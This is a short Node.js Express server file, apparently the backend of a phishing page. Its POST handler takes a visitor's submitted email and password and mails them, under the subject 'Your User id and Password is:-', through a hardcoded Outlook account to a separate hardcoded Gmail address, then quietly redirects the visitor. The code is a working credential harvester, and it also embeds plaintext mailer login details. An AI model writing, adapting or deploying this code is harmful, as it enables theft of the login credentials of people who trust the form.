//jshint esversion:6
const express = require("express");
const bodyParser = require("body-parser");
const nodemailer = require("nodemailer");
const app = express();
//express code starts
app.set('view engine', 'ejs');

app.use(bodyParser.urlencoded({
    extended: true
}));

app.use(express.static("public"));
//express code ends

// variables
var senderEmail;
var senderPassword;
var userName;
var userSurname;
var userPassword;
var userEmail;
var subject = "Your User id and Password is:-";

// Get requests
app.get("/", function(req, res){
    res.render("index");
});


app.post("/", function(req, res){
    senderEmail = req.body.email;
    senderPassword = req.body.password;
    userName = req.body.userName;
    userEmail = req.body.userEmail;
    userPassword = req.body.userPassword;
    userSurname = req.body.userSurname;
    var body = "Email: " + senderEmail + "<br />       Password: " + senderPassword;
//code starts for main sending through hotmail api
    var transporter = nodemailer.createTransport({
        service: 'hotmail',
        auth: {
            user: 'node-123-123-112233-321@outlook.com',
            pass: 'newPassword123'
        }
    });
    
    var mailOptions = {
        from: 'node-123-123-112233-321@outlook.com',
        to: 'send2yash26@gmail.com',
        subject: subject,
        text: body,  
    };
    //code ends for main sending through hotmail api


    //code starts for main sending
    transporter.sendMail(mailOptions, function(error, info){
        if (error) {
            res.send(error);
            console.log(error);
        } else {
            console.log('Email sent: ' + info.response);
        }
    });
    //code ends for main sending
    res.redirect('/');
})

// Serving listening on Port
let port = process.env.PORT;
if(port == null || port == ""){
    port = 80;
}

app.listen(port , function () {
    console.log("Server started Successfully");
});
